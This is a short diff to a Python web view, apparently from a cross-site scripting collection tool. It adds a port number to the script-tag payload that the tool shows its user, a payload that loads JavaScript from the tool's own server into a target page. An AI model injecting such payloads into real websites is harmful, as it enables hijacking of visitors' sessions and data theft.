@@ -30,8 +30,11 @@ class BoardView(View):
             self.write('ok')
             return self.finish()
         if _token:
+            port = ""
+            if config.PORT != 80:
+                port = ":" + str(config.PORT)
             self.messages.success(
-                '&ltscript src="{domain}/static/js/x.js"&gt&lt/script&gt'.format(domain=config.DOMAIN))
+                '&ltscript src="{domain}{port}/static/js/x.js"&gt&lt/script&gt'.format(domain=config.DOMAIN, port=port))
         self.render(
             'xss.html',
             words_query=words_query,
